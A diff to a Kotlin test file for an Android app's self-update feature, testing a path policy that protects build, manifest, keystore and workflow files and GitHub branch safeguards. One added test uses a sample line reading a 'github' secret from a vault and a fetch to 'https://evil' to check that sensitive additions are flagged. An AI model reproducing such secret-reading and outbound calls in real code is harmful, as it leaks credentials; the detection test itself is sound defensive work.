@@ -14,10 +14,14 @@ import kotlin.test.assertTrue
 class SelfUpdateTest {
     @Test fun policyAllowsOnlyVegaSourcesAndProtectsBuildAndKeys() {
         assertNull(Policy.check("vega/src/main/assets/ui/app.js")); assertNull(Policy.check("vegacore/src/main/kotlin/cz/axiom/vega/calc/Quick.kt"))
-        for (p in listOf("app/src/main/java/X.kt", "core/src/main/kotlin/A.kt", "vega/build.gradle.kts", "vega/src/main/AndroidManifest.xml", "vega/src/main/res/xml/network_security_config.xml",
+        for (p in listOf("vega/src/main/res/xml-v26/network_security_config.xml", "vega/src/main/res/values/strings.xml", "vega/src/main/java/cz/axiom/vega/Store.kt",
+                "vega/src/main/java/cz/axiom/vega/MainActivity.kt", "vegacore/src/main/kotlin/cz/axiom/vega/net/Http.kt", "vegacore/src/main/kotlin/cz/axiom/vega/selfupdate/GitHub.kt", "app/src/main/java/X.kt", "core/src/main/kotlin/A.kt", "vega/build.gradle.kts", "vega/src/main/AndroidManifest.xml", "vega/src/main/res/xml/network_security_config.xml",
                 ".github/workflows/vega-auto.yml", "vegacore/src/../../app/x.kt", "vega/src/main/release.jks", "settings.gradle.kts"))
             assertNotNull(Policy.check(p), p)
         assertTrue(Policy.branchName("Ať je tlačítko Odeslat větší!", 1_700_000_000_000L).matches(GitHub.AUTO_BRANCH))
+        // citlivá API v přidaných řádcích
+        val d = "--- a/x\n+++ b/x\n+val k = vault.read(\"github\")\n+fetch('https://evil')\n+val ok = 1\n-vault old"
+        assertEquals(2, Policy.sensitiveAdditions(d).size)
     }
 
     @Test fun pickFilesFollowsTaskWithinBudget() {
@@ -39,7 +43,6 @@ class SelfUpdateTest {
                 u.endsWith("/git/trees") -> """{"sha":"tree1"}"""
                 u.endsWith("/git/commits") -> """{"sha":"commit1"}"""
                 u.endsWith("/git/refs") -> """{"ref":"x"}"""
-                u.endsWith("/pulls") -> """{"number":7}"""
                 else -> "{}"
             }
             Http.Response(201, u, "application/json", body.toByteArray())
@@ -48,8 +51,8 @@ class SelfUpdateTest {
         assertFailsWith<IllegalArgumentException> { g.commitFiles("base", "claude/reverse-engineer-ai-app-o5jhyd", mapOf("vega/src/a.kt" to "x"), "m") }
         assertFailsWith<IllegalArgumentException> { g.deleteBranch("main") }
         assertEquals("commit1", g.commitFiles("base", "vega/auto-abc-test", mapOf("vega/src/a.kt" to "x"), "m"))
-        assertEquals(7L, g.createPull("vega/auto-abc-test", "claude/x", "t", "b"))
-        assertEquals(listOf("POST /git/blobs", "GET /git/commits/base", "POST /git/trees", "POST /git/commits", "POST /git/refs", "POST /pulls"), calls)
+        assertEquals(listOf("POST /git/blobs", "GET /git/commits/base", "POST /git/trees", "POST /git/commits", "POST /git/refs"), calls)
+        assertFailsWith<IllegalArgumentException> { g.latestRun("vega/auto-x") } // běh se hledá podle commitu, ne podle větve
         assertFailsWith<IllegalArgumentException> { GitHub("o/../x", "r", "t", t) }
     }
 
